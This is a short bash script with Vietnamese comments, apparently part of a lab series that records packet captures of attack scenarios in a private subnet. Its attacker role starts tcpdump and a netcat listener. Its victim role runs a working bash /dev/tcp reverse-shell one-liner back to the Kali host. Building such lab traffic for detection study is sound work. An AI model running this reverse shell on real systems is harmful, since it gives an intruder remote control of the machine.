#!/bin/bash
set -euo pipefail
# Kịch bản 5: Reverse shell bằng netcat
# Chạy PHẦN A trên Kali trước, PHẦN B trên victim sau

ROLE=${1:-}

KALI_IP="172.28.0.20"
PORT=4444
IFACE="eth0"

PCAP_DIR="${PCAP_DIR:-/root/pcap}"
mkdir -p "$PCAP_DIR"
TIME=$(date +%Y%m%d_%H%M%S)
PCAP="$PCAP_DIR/05_reverse_shell_$TIME.pcap"

if [ "$ROLE" == "attacker" ]; then
    echo "Bên Kali: mở listener cổng $PORT, bắt gói tin vào $PCAP"
    tcpdump -i "$IFACE" -U -w "$PCAP" net 172.28.0.0/24 and port "$PORT" &
    PID=$!
    trap 'kill -INT "$PID" 2>/dev/null || true; wait "$PID" 2>/dev/null || true' EXIT
    sleep 0.3
    kill -0 "$PID"
    sleep 1
    nc -lvnp "$PORT"
    kill -INT "$PID"
    wait "$PID" || true
    trap - EXIT
    echo "Xong bên Kali."

elif [ "$ROLE" == "victim" ]; then
    echo "Bên victim: kết nối ngược về $KALI_IP:$PORT"
    bash -i >& /dev/tcp/$KALI_IP/$PORT 0>&1

else
    echo "Cách dùng: $0 attacker   (trên Kali)"
    echo "      hoặc: $0 victim     (trên victim)"
fi
